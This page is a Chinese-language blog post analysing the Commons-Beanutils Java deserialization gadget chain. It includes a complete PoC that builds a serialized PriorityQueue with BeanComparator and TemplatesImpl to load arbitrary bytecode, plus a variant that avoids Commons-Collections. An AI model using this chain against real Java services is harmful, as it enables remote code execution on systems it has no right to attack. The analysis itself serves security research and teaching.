@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ka1t4v.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Commons-Beanutils12345678PriorityQueue#readObject() -&gt; PriorityQueue#heapify()   -&gt; PriorityQueue#siftDown()   -&gt; PriorityQueue#siftDownUsingComparator()    -&gt; BeanComparator#compare()">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Commons-Beanutils反序列化链分析">
+<meta property="og:url" content="https://ka1t4v.github.io/2022/04/20/Commons-Beanutils_%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Ka1t4v">
+<meta property="og:description" content="Commons-Beanutils12345678PriorityQueue#readObject() -&gt; PriorityQueue#heapify()   -&gt; PriorityQueue#siftDown()   -&gt; PriorityQueue#siftDownUsingComparator()    -&gt; BeanComparator#compare()">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420182249169.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420183337990.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420214228961.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420214335849.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420215125223.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/1650557234103-2fdede61-c571-4e3d-aca3-de2a491c0911.png">
+<meta property="og:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/1650557350574-6b97a01c-270e-41da-b8c9-f093609eb8c9.png">
+<meta property="article:published_time" content="2022-04-20T07:46:25.000Z">
+<meta property="article:modified_time" content="2022-07-28T09:30:07.005Z">
+<meta property="article:author" content="Ka1t4v">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420182249169.png">
+
+<link rel="canonical" href="https://ka1t4v.github.io/2022/04/20/Commons-Beanutils_%E9%93%BE%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Commons-Beanutils反序列化链分析 | Ka1t4v</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ka1t4v</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ka1t4v.github.io/2022/04/20/Commons-Beanutils_%E9%93%BE%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/config/avatar.jpg">
+      <meta itemprop="name" content="Ka1t4v">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ka1t4v">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Commons-Beanutils反序列化链分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-04-20 15:46:25" itemprop="dateCreated datePublished" datetime="2022-04-20T15:46:25+08:00">2022-04-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Commons-Beanutils"><a href="#Commons-Beanutils" class="headerlink" title="Commons-Beanutils"></a>Commons-Beanutils</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue#readObject()</span><br><span class="line"> -&gt; PriorityQueue#heapify() </span><br><span class="line">  -&gt; PriorityQueue#siftDown()</span><br><span class="line">   -&gt; PriorityQueue#siftDownUsingComparator()</span><br><span class="line">    -&gt; BeanComparator#compare()</span><br><span class="line">     -&gt; PropertyUtils#getProperty()</span><br><span class="line">      -&gt; TemplatesImpl#getOutputProperties()</span><br><span class="line">       -&gt; arbitrary bytecode load</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法</p>
+<p>maven添加Apache Commons Beanutils</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任 意JavaBean的getter方法，比如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(a, <span class="string">&quot;b&quot;</span>);<span class="comment">//实际上会调用a对象的getB()方法</span></span><br></pre></td></tr></table></figure>
+
+<p>除此之外， PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有对象b，b对象 中有属性c，我们可以通过 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(a, <span class="string">&quot;b.c&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<p>的方式进行递归获取。通过这个 方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。</p>
+<p><strong>PropertyUtils.getProperty结合使用TemplatesImpl</strong></p>
+<p>追溯一下TemplatesImpl调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() </span><br><span class="line">   -&gt; TemplatesImpl#newTransformer() </span><br><span class="line">      -&gt; TemplatesImpl#getTransletInstance() </span><br><span class="line">         -&gt; TemplatesImpl#defineTransletClasses() </span><br><span class="line">            -&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
+
+<p>之前的cc链的利用都是通过直接调用newTransformer()方法进行利用，那么实际上还有一个getOutputProperties()方法，这个方法以get开头符合getter的命名规则，那么就可以使用PropertyUtils.getProperty来调用，从而实现链攻击执行</p>
+<p>那么就要找到使用了PropertyUtils.getProperty()方法的类</p>
+<p><strong>org.apache.commons.beanutils.BeanComparator</strong></p>
+<p>BeanComparator 是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了 java.util.Comparator 接口。我们看它的compare方法</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420182249169.png" alt="image-20220420182249169"></p>
+<p>使用到了PropertyUtils.getProperty()方法，并且传入参数o1和o2可控，那么作为一个实现了Comparator接口的类，可以结合PriorityQueue类来实现链</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420183337990.png" alt="image-20220420183337990"></p>
+<p>会对PriorityQueue中的队列元素进行comapre操作，那么传入元素如果构造为TemplatesImpl类则会触发利用链</p>
+<h2 id="构造基本利用链"><a href="#构造基本利用链" class="headerlink" title="构造基本利用链"></a>构造基本利用链</h2><p>首先创建TemplatesImpl对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        util.setfieldvalue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;ClassPool.getDefault().get(evalclass.class.getName()).toBytecode()&#125;);</span><br><span class="line">        util.setfieldvalue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;evalclass&quot;</span>);</span><br><span class="line">        util.setfieldvalue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>
+
+<p>然后初始化BeanComparator对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里先传入无害的字符串，最后使用反射替换</span></span><br><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br></pre></td></tr></table></figure>
+
+<p>初始化PriorityQueue对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//同样插入两个无害对象，最后进行替换</span></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后反射修改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setField.setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;OutputProperties&quot;</span>);</span><br><span class="line">setField.setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj,obj&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>完整代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(evalclass.class.getName());</span><br><span class="line">    <span class="type">byte</span>[] eval = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setField.setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;eval&#125;);</span><br><span class="line">    setField.setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;evalclass&quot;</span>);</span><br><span class="line">    setField.setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    setField.setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    setField.setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj,obj&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">arr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(arr);</span><br><span class="line">    oos.writeObject(priorityQueue);</span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(arr.toByteArray()));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注：这里使用PropertyUtils.getProperty有一个需要注意的点，即第二个参数是字段名</p>
+<p>但如果假设一个简单的Bean类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123; </span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;catalina&quot;</span>; </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用PropertyUtils.getProperty获取name应为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Cat</span>(),<span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此处必须是全小写name而不能是Name，如果是Name则会报错找不到元素</p>
+<p>因为变量是name的情况下，自动生成的getter和setter会将name首字母大写变成getName和setName</p>
+<p><strong>关于ysoserial为什么使用BigInteger</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>因为1.6版本commons-beanutils没有无参的构造函数，构造时必须传入一个property值，为了不报错成功构造，需要传入一个无害的类并且具有getter方法，所以选用了<strong>BigInteger#getLowestSetBit()</strong></p>
+<p>这里我们用1.7版本，所以可以使用无参的构造函数，不受影响</p>
+<h2 id="不依赖Commons-Collections的CB链"><a href="#不依赖Commons-Collections的CB链" class="headerlink" title="不依赖Commons-Collections的CB链"></a>不依赖Commons-Collections的CB链</h2><p>我们发现在正常的poc构造流程中，没有使用到任何cc库，但实际上在初始化BeanComparator类时使用到了一次</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420214228961.png" alt="image-20220420214228961"></p>
+<p>因为前面是无参构造，所以最终会执行最下面一个构造函数，但其中的ComparableComparator.getInstance()是基于cc库</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420214335849.png" alt="image-20220420214335849"></p>
+<p>那么如果我们初始化时传入一个Comparator类，并且此类实现了Comparator接口，并且不在cc库中即可，那么需要满足以下条件</p>
+<ul>
+<li><p>实现 java.util.Comparator 接口 </p>
+</li>
+<li><p>实现 java.io.Serializable 接口 </p>
+</li>
+<li><p>Java、shiro或commons-beanutils自带，且兼容性强</p>
+</li>
+</ul>
+<p>最终选择CaseInsensitiveComparator类</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20220420215125223.png" alt="image-20220420215125223"></p>
+<p>这个 CaseInsensitiveComparator 类是 java.lang.String 类下的一个内部私有类，其实现了 Comparator 和 Serializable ，且位于Java的核心代码中，兼容性强，是一个完美替代品。 我们通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator ：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br></pre></td></tr></table></figure>
+
+<p>即可完全不依赖cc库</p>
+<p>但是由于之后的PriorityQueue的add操作会触发comapre操作，</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/1650557234103-2fdede61-c571-4e3d-aca3-de2a491c0911.png" alt="img"></p>
+<p>但是初始化时传入的property&#x3D;null所以会直接调用String.CASE_INSENSITIVE_ORDER的comapre方法</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/1650557350574-6b97a01c-270e-41da-b8c9-f093609eb8c9.png" alt="img"></p>
+<p>这里compare传的参数必须为String，所以在后面的add操作中，需要将插入的数据改成String变量</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">priorityQueue.add(<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/19/Spring%20beans%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="Spring beans RCE 漏洞复现">
+      <i class="fa fa-chevron-left"></i> Spring beans RCE 漏洞复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/21/Commons-Collections4_%E9%93%BE%E5%88%86%E6%9E%90/" rel="next" title="Commons-Collections4反序列化链分析">
+      Commons-Collections4反序列化链分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Commons-Beanutils"><span class="nav-number">1.</span> <span class="nav-text">Commons-Beanutils</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%9F%BA%E6%9C%AC%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">1.1.</span> <span class="nav-text">构造基本利用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E4%BE%9D%E8%B5%96Commons-Collections%E7%9A%84CB%E9%93%BE"><span class="nav-number">1.2.</span> <span class="nav-text">不依赖Commons-Collections的CB链</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ka1t4v"
+      src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/config/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Ka1t4v</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ka1t4v" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ka1t4v" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ka1t4v@gmail.com" title="E-Mail → mailto:ka1t4v@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ka1t4v</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
